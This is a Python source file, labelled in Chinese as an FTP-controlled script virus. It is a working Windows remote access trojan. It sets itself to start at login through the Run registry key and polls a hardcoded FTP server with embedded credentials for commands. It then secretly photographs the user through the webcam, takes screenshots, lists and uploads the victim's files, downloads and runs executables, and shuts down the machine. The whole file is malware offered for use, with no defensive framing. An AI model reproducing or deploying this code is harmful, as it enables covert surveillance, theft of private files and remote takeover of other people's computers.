# 基于ftp控制的脚本病毒
import ftplib
import os
import json
import time
import winreg
import cv2
import win32api
import win32con
import pyautogui


def show_message_box_ok(text, title):
    win32api.MessageBox(0, text, title, win32con.MB_OK)


class FTP_U:
    def __init__(self):
        """
        初始化函数，用于生成功能更强的ftp对象
        """
        self.is_login = False
        self.ftp = ftplib.FTP()
        self.ftp.set_debuglevel(2)
        self.user = ""
        self.password = ""

    def connect(self, user, password, ip, port=21) -> bool:
        """
        用于连接ftp服务器
        :param port: 端口
        :param ip: ip
        :param user: 账号字符串
        :param password: 密码字符串
        :return: type
        """
        try:
            self.ftp.connect(ip, port)
            self.ftp.login(user, password)
            self.is_login = True
            return True
        except Exception as e:
            print(e)
            return False

    def upload_file(self, file_path, ftp_file_path) -> bool:
        """
        用于从ftp服务器上上传文件
        :param file_path: 本地文件目录
        :param ftp_file_path: 目标ftp文件目录
        :return: type
        """
        fp = open(file_path, 'rb')
        cmd = 'STOR ' + str(ftp_file_path)
        try:
            self.ftp.storbinary(cmd, fp)
            return True
        except Exception as e:
            print(e)
            return False

    def download_file(self, file_path, ftp_path) -> bool:
        """
        用于从ftp服务器上下载文件到本地
        :param file_path: 到本地的文件目录
        :param ftp_path: 目标ftp文件目录
        :return: type
        """
        try:
            self.ftp.nlst(ftp_path)  # 获取目录下的文件
            file_handle = open(file_path, "wb").write  # 以写模式在本地打开文件
            self.ftp.retrbinary("RETR " + str(ftp_path), file_handle)  # 接收服务器上文件并写入本地文件
            return True
        except Exception as e:
            print(e)
            return False

    def write_log(self, log_text, ftp_path) -> bool:
        """
        此函数用于向目标ftp文件写入日志
        :param log_text:日志文字
        :param ftp_path:目标日志文件
        :return: type
        """

        if self.download_file(ftp_path=ftp_path, file_path="./log.txt"):
            with open("./log.txt", 'a') as f:
                f.write(log_text)
            if self.upload_file(file_path="./log.txt", ftp_file_path=ftp_path):
                return True
            else:
                return False
        else:
            return False

    def write_to_ftp(self, text, ftp_path) -> bool:
        """
        此函数用于向对应ftp文件写入字符串
        :param text: 文字字符串
        :param ftp_path: ftp文件路径
        :return: type
        """
        file_ftp_name = ftp_path.split("/")[-1]
        if self.download_file(ftp_path=ftp_path, file_path="./" + file_ftp_name):
            with open("./" + file_ftp_name, 'a') as f:
                f.write(text)
            if self.upload_file(file_path="./" + file_ftp_name, ftp_file_path=ftp_path):
                os.remove("./" + file_ftp_name)
                return True
            else:
                return False
        else:
            return False

    def close(self) -> bool:
        """
        用于关闭ftp对象
        :return: type
        """
        if self.is_login:
            self.ftp.quit()
            return True
        else:
            return False


class CommandAnalyze:
    def __init__(self):
        """
        此类用于保存命令所对应的函数体
        """
        self.command_dict = {}

    def add_command(self, func, command):
        """
        添加命令体
        :param func:函数体
        :param command: 命令字符串
        :return: None
        """
        self.command_dict[command] = func

    def check_command(self, text, ftp):
        print(text.split('=')[0][1:-1])
        print(self.command_dict)
        if text.split('=')[0][1:-1] in [i for i in self.command_dict.keys()]:
            print('检测到命令!')
            self.run_command(text.split('=')[0][1:-1], [ftp, text.split('=')[1][1:-1]])

    def run_command(self, command, params_list):
        """
        运行命令
        :param command:命令字符串
        :param params_list: 参数列表
        :return: None
        """
        print(command, params_list)
        self.command_dict[command](params_list)


"""判断键是否存在"""


def Judge_Key(key_name,
              reg_root=win32con.HKEY_CURRENT_USER,
              # 根节点  其中的值可以有：HKEY_CLASSES_ROOT、HKEY_CURRENT_USER、HKEY_LOCAL_MACHINE、HKEY_USERS、HKEY_CURRENT_CONFIG
              reg_path=r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",  # 键的路径
              ):
    # print(key_name)
    """
    :param key_name: #  要查询的键名
    :param reg_root: # 根节点
#win32con.HKEY_CURRENT_USER
#win32con.HKEY_CLASSES_ROOT
#win32con.HKEY_CURRENT_USER
#win32con.HKEY_LOCAL_MACHINE
#win32con.HKEY_USERS
#win32con.HKEY_CURRENT_CONFIG
    :param reg_path: #  键的路径
    :return:feedback是（0/1/2/3：存在/不存在/权限不足/报错）
    """
    reg_flags = win32con.WRITE_OWNER | win32con.KEY_WOW64_64KEY | win32con.KEY_ALL_ACCESS
    try:
        key = winreg.OpenKey(reg_root, reg_path, 0, reg_flags)
        location, type = winreg.QueryValueEx(key, key_name)
        print("键存在", "location（数据）:", location, "type:", type)
        feedback = 0
    except FileNotFoundError as e:
        print("键不存在", e)
        feedback = 1
    except PermissionError as e:
        print("权限不足", e)
        feedback = 2
    except:
        print("Error")
        feedback = 3
    return feedback


"""开机自启动"""


def self_open(switch="open",  # 开：open # 关：close
              current_file=None,
              abspath=os.path.abspath(os.path.dirname(__file__))):
    json_dict = json.loads(open("./setting.json", 'r').read())
    zdynames = json_dict['name']

    path = abspath + '\\' + zdynames  # 要添加的exe完整路径如：
    judge_key = Judge_Key(reg_root=win32con.HKEY_CURRENT_USER,
                          reg_path=r"Software\Microsoft\Windows\CurrentVersion\Run",  # 键的路径
                          key_name=current_file)
    # 注册表项名
    KeyName = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, KeyName, 0, win32con.KEY_ALL_ACCESS)
    if switch == "open":
        # 异常处理
        try:
            if judge_key == 0:
                print("已经开启了，无需再开启")
            elif judge_key == 1:
                win32api.RegSetValueEx(key, current_file, 0, win32con.REG_SZ, path)
                win32api.RegCloseKey(key)
                print('开机自启动添加成功！')
        except:
            print('添加失败')
    elif switch == "close":
        try:
            if judge_key == 0:
                win32api.RegDeleteValue(key, current_file)  # 删除值
                win32api.RegCloseKey(key)
                print('成功删除键！')
            elif judge_key == 1:
                print("键不存在")
            elif judge_key == 2:
                print("权限不足")
            else:
                print("出现错误")
        except:
            print('删除失败')


# 011.3vftp.cn
# hbw
# hongbinwe
"""------------------------命令定义区-----------------------------"""


def shutdown(args):
    """
    关机命令
    :param args:[时间秒]
    :return:
    """
    cmd = 'shutdown -s -t ' + str(args[1])
    os.system(cmd)


def take_a_photo(args):
    """
    摄像头拍照
    :param args:[ftp]
    :return: None
    """
    try:
        cap = cv2.VideoCapture(0)  # 开启摄像头
        f, frame = cap.read()  # 将摄像头中的一帧图片数据保存
        file_name = time.strftime("%m_%d_%Hh_%Mmin_take.jpg", time.localtime())
        print(file_name)
        cv2.imwrite(file_name, frame)  # 将图片保存为本地文件
        cap.release()  # 关闭摄像头
        args[0].upload_file('./' + file_name, '/virus/files/imgs/' + file_name)
        os.remove('./' + file_name)
    except Exception as e:
        args[0].write_log("[!]摄像头拍摄时出现错误！" + str(e), "/virus/log.txt")


def shut_screen(args):
    """
    截图命令
    :param args:[ftp]
    :return:
    """
    try:
        file_name = time.strftime("%m_%d_%Hh_%Mmin_shut.jpg", time.localtime())
        pyautogui.screenshot().save(file_name)
        args[0].upload_file('./' + file_name, '/virus/files/imgs/' + file_name)
        os.remove('./' + file_name)
    except Exception as e:
        args[0].write_log("[!]截图时出现错误！" + str(e), "/virus/log.txt")


def down_exe(args):
    """
    下载exe文件
    :param args:[ftp,ftp_file_path]
    :return:
    """
    try:
        args[0].download_file('./' + args[1].split('/')[-1], args[1])
    except Exception as e:
        args[0].write_log("[!下载exe时出现错误！" + str(e), "/virus/log.txt")


def run_exe(args):
    """
    运行exe文件
    :param args:[exe_file_path]
    :return:
    """
    try:
        cmd = 'start ' + args[1]
        os.system(cmd)
    except Exception as e:
        args[0].write_log("[!下载exe时出现错误！" + str(e), "/virus/log.txt")


def walk_files(args):
    try:
        all_list = []
        file_list = [0, 0, 0, '===================']
        for root, dir, files in os.walk(args[1]):
            file_list[0] = str(root) + '\n'
            file_list[1] = str(dir) + '\n'
            file_list[2] = str(files) + '\n'
            all_list.append(file_list)
        args[0].write_to_ftp(str(all_list), '/virus/dir.txt')
    except Exception as e:
        args[0].write_log("[!]walk文件时出现错误！" + str(e), "/virus/log.txt")


def dir_files(args):
    try:
        print(args)
        all_list = []
        for i in os.listdir(args[1]):
            all_list.append(str(i))
        args[0].write_to_ftp(str(all_list), '/virus/files/dir.txt')
    except Exception as e:
        args[0].write_log("[!]dir文件时出现错误！" + str(e), "/virus/log.txt")


def upload_file(args):
    try:
        args[0].upload_file(args[1], '/virus/files/file_upload/' + args[1].split('\\')[-1])
    except Exception as e:
        args[0].write_log("[!]上传文件时出现错误！" + str(e), "/virus/log.txt")


ftp = FTP_U()

ccommand_list = [shutdown, take_a_photo, shut_screen, down_exe, run_exe, walk_files, dir_files, upload_file]
command_a = CommandAnalyze()

for i in ccommand_list:
    command_a.add_command(i, i.__name__)


def main():
    while True:
        ftp.connect('hbw', 'hongbinwen', '011.3vftp.cn')
        time.sleep(20)
        ftp.download_file('./command.txt', '/virus/command.txt')
        with open('./command.txt', 'r') as f:
            command_a.check_command(f.read(), ftp)
        os.remove('./command.txt')
        ftp.close()

main()
